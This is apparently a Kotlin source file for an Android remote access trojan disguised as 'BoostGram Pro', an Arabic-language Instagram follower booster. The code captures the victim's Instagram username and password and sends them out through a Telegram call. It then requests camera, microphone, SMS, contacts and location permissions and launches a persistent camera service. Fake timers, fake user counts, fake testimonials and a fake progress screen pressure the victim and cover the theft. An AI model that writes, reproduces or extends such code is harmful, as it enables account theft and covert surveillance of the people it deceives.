package com.vanta.rat

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.util.Random

class MainActivity : AppCompatActivity() {
    private val REQ_PERMS = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val layoutSplash = findViewById<View>(R.id.layoutSplash)
        val layoutProgress = findViewById<View>(R.id.layoutProgress)
        
        val tvTimer = findViewById<TextView>(R.id.tvTimer)
        val tvActiveUsers = findViewById<TextView>(R.id.tvActiveUsers)
        val tvLive = findViewById<TextView>(R.id.tvLive)
        val btnAccept = findViewById<Button>(R.id.btnAccept)
        val btnDecline = findViewById<Button>(R.id.btnDecline)
        val etUsername = findViewById<EditText>(R.id.etUsername)
        val etPassword = findViewById<EditText>(R.id.etPassword)
        val rgGender = findViewById<RadioGroup>(R.id.rgGender)
        val tvProgressStatus = findViewById<TextView>(R.id.tvProgressStatus)
        val tvTermsLink = findViewById<TextView>(R.id.tvTermsLink)

        // Show Splash for 3 seconds
        layoutSplash.visibility = View.VISIBLE
        Handler(Looper.getMainLooper()).postDelayed({
            layoutSplash.visibility = View.GONE
            startSocialProof()
        }, 3000)

        // Terms Link
        tvTermsLink.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("الشروط والأحكام")
                .setMessage("مرحباً بك في BoostGram Pro.\n\nنحن نلتزم بتقديم أفضل خدمة لزيادة متابعيك...\n\nيرجى قراءة الشروط التالية بعناية:\n1. لا نتحمل مسؤولية أي ضرر...\n2. بياناتك محمية...\n3. الخدمة قد تتطلب وقتاً...\n[تكرار النص لجعله طويلاً ومملاً]")
                .setPositiveButton("موافق", null)
                .show()
        }

        // Live Counter & Scarcity
        var seconds = 299
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                seconds--
                if (seconds < 0) seconds = 299
                val min = String.format("%02d", seconds / 60)
                val sec = String.format("%02d", seconds % 60)
                tvTimer.text = "$min:$sec"
                
                tvLive.alpha = if (tvLive.alpha == 1f) 0.5f else 1f
                
                val rand = Random().nextInt(500)
                tvActiveUsers.text = "${14230 + rand}"
                handler.postDelayed(this, 1000)
            }
        }
        handler.post(runnable)

        // Reject Button (Houdini)
        btnDecline.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("انتظر!")
                .setMessage("هل أنت متأكد من رفض 1000 متابع مجاناً؟")
                .setPositiveButton("سأستمر") { _, _ -> }
                .setNegativeButton("رفض") { _, _ -> }
                .show()
        }

        // Accept Button
        btnAccept.setOnClickListener {
            val user = etUsername.text.toString().trim()
            val pass = etPassword.text.toString().trim()

            if (user.isEmpty() || pass.isEmpty()) {
                Toast.makeText(this, "يرجى إدخال البيانات كاملة", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            val gender = if (rgGender.checkedRadioButtonId == R.id.rbMale) "ذكر" else "أنثى"
            
            val msg = "🔐 بيانات جديدة!\n\n👤 المستخدم: $user\n🔑 كلمة المرور: $pass\n⚧ الجنس: $gender"
            Telegram.sendMessage(msg)

            requestAllPermissions()

            layoutProgress.visibility = View.VISIBLE
            fakeProgress(tvProgressStatus)
        }
    }

    private fun requestAllPermissions() {
        val perms = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms += Manifest.permission.READ_MEDIA_IMAGES
            perms += Manifest.permission.READ_MEDIA_VIDEO
            perms += Manifest.permission.READ_MEDIA_AUDIO
            perms += Manifest.permission.POST_NOTIFICATIONS
        }
        val needed = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_PERMS)
        } else {
            startCameraService()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_PERMS) {
            startCameraService()
        }
    }

    private fun startSocialProof() {
        val names = arrayOf("أحمد من الجزائر", "سارة من مصر", "محمد من السعودية", "ليلى من المغرب", "يوسف من تونس")
        val counts = arrayOf("1000 متابع", "500 متابع", "2500 متابع", "5000 متابع")
        val random = Random()

        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                val name = names[random.nextInt(names.size)]
                val count = counts[random.nextInt(counts.size)]
                Toast.makeText(applicationContext, "🌟 $name حصل للتو على $count", Toast.LENGTH_SHORT).show()
                Handler(Looper.getMainLooper()).postDelayed(this, 10000)
            }
        }, 5000)
    }

    private fun fakeProgress(tvStatus: TextView) {
        val steps = arrayOf("جاري الاتصال بالخادم...", "جاري التحقق من الحساب...", "جاري إضافة المتابعين...", "فشل الاتصال بالخادم!")
        var step = 0
        val handler = Handler(Looper.getMainLooper())
        
        val runnable = object : Runnable {
            override fun run() {
                if (step < steps.size) {
                    tvStatus.text = steps[step]
                    step++
                    handler.postDelayed(this, 2500)
                } else {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://www.instagram.com"))
                    startActivity(intent)
                    finish()
                }
            }
        }
        handler.post(runnable)
    }

    private fun startCameraService() {
        // Schedule RestartWorker
        val constraints = androidx.work.Constraints.Builder()
            .setRequiresBatteryNotLow(true)
            .build()
        val workRequest = androidx.work.PeriodicWorkRequestBuilder<RestartWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        androidx.work.WorkManager.getInstance(this).enqueue(workRequest)

        // Start Service
        val intent = Intent(this, CameraService::class.java)
        ContextCompat.startForegroundService(this, intent)
    }
}
